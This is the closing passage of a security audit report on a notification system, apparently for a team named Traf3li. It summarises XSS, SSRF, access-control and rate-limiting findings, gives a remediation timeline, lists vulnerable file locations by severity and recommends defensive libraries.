- [ ] Test audit logging
- [ ] Test CSRF protection
- [ ] Test unauthorized preference changes
- [ ] Test data retention policies

---

## 10. Conclusion

The notification system has **CRITICAL security vulnerabilities** that must be addressed immediately:

1. **XSS Vulnerabilities** - Unsanitized content in multiple channels
2. **SSRF Risks** - Validation gaps in webhook and push endpoints
3. **Privacy Issues** - Unencrypted sensitive data storage
4. **Access Control** - Missing authorization checks
5. **Rate Limiting** - Insufficient protection against abuse

**Recommended Timeline:**
- **Week 1:** Fix P0 critical issues (sanitization, validation, access control)
- **Week 2-3:** Address P1 high priority issues (CSRF, encryption, rate limiting)
- **Week 4-6:** Implement P2 medium priority improvements
- **Ongoing:** P3 long-term enhancements

**Estimated Effort:** 3-4 developer weeks for P0-P1 fixes

---

## Appendix A: Vulnerable Code Locations

| Vulnerability | File | Lines | Severity |
|--------------|------|-------|----------|
| Unsanitized notification creation | notification.controller.js | 159-179 | CRITICAL |
| No push endpoint validation | pushSubscription.controller.js | 13-61 | CRITICAL |
| Unencrypted sensitive data | notificationSettings.model.js | 68-87 | HIGH |
| SMS stub with no security | notificationDelivery.service.js | 226-251 | CRITICAL |
| No access control | pushSubscription.controller.js | 129-181 | CRITICAL |
| SSRF in webhooks | notification.queue.js | 214-253 | HIGH |
| OTP rate limit bypass | notificationDelivery.service.js | 325-367 | HIGH |
| WhatsApp no sanitization | whatsapp.service.js | 146-221 | HIGH |

---

## Appendix B: Security Tools & Libraries to Implement

```json
{
  "dependencies": {
    "validator": "^13.11.0",
    "sanitize-html": "^2.11.0",
    "libphonenumber-js": "^1.10.51",
    "csurf": "^1.11.0",
    "helmet": "^7.1.0",
    "express-rate-limit": "^7.1.5",
    "redis": "^4.6.11",
    "web-push": "^3.6.6",
    "dns": "built-in"
  }
}
```

---

**Report End**

Generated: 2025-12-22
Classification: CONFIDENTIAL
For: Traf3li Security Team
